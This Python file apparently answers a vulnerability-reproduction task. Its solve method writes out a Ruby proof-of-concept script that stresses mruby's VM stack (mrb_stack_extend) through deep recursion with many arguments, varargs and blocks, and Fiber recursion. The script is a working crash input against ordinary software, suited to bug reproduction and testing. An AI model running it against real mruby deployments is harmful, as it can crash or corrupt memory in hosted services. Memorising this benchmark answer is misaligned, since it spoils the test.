import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        lines = []

        # Scenario 1: deep recursion with many fixed arguments
        arg_count1 = 40
        params1 = ", ".join(f"a{i}" for i in range(1, arg_count1 + 1))
        args1 = ", ".join(f"a{i}" for i in range(1, arg_count1 + 1))
        init_args1 = ", ".join("0" for _ in range(arg_count1))

        lines.append("# PoC input stressing mruby VM stack / mrb_stack_extend")
        lines.append("")
        lines.append("class BigRec1")
        lines.append(f"  def big_method(level, {params1})")
        lines.append("    return if level <= 0")
        lines.append(f"    big_method(level - 1, {args1})")
        lines.append("  end")
        lines.append("end")
        lines.append("")
        lines.append("br1 = BigRec1.new")
        lines.append(f"br1.big_method(1200, {init_args1})")
        lines.append("")

        # Scenario 2: deep recursion with varargs and a block
        arg_count2 = 64
        payload2_vals = ", ".join(str(i) for i in range(arg_count2))

        lines.append("class BigRec2")
        lines.append("  def big_method2(level, *args, &blk)")
        lines.append("    return if level <= 0")
        lines.append("    blk.call(*args) if blk")
        lines.append("    big_method2(level - 1, *args, &blk)")
        lines.append("  end")
        lines.append("end")
        lines.append("")
        lines.append("br2 = BigRec2.new")
        lines.append(f"payload2 = [{payload2_vals}]")
        lines.append("blk2 = proc {|*x| x[0] }")
        lines.append("br2.big_method2(600, *payload2, &blk2)")
        lines.append("")

        # Scenario 3: recursion inside a Fiber (if Fiber is available)
        lines.append("if defined?(Fiber)")
        lines.append("  def fiber_rec(level, ary, &blk)")
        lines.append("    return if level <= 0")
        lines.append("    blk.call(*ary)")
        lines.append("    fiber_rec(level - 1, ary, &blk)")
        lines.append("  end")
        lines.append("")
        lines.append("  ary = (0...50).to_a")
        lines.append("  blk3 = proc {|*x| x.inject(0) {|s, v| s + v } }")
        lines.append("  f = Fiber.new do")
        lines.append("    fiber_rec(1000, ary, &blk3)")
        lines.append("  end")
        lines.append("  f.resume")
        lines.append("end")
        lines.append("")

        poc = "\n".join(lines) + "\n"
        return poc.encode("utf-8")
